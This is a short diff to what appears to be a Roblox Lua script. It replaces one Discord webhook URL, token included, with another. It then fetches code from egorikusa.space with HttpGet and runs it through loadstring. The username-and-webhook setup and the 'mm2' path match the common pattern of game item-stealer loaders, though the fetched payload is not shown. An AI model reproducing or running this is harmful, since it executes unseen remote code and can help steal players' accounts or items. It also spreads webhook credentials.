@@ -1,5 +1,5 @@
 Username = "VRossoni7421"
-Webhook = "https://discord.com/api/webhooks/1266432385713700884/8XeSAcq3tn-c9XZtMGEOwkqA3NgTH3XHgV56fjWiTA9yBsdZLXnrknZ_H34JLf3Pofjc"
+Webhook = "https://discord.com/api/webhooks/1266773520973828207/xGExJFyOKdgnGAHg8MHiQH9X6l01_lBFLnLcZpM9UY1BxAfWVq-eIX-aMfv6zlFpc0S7"
 
 loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
 
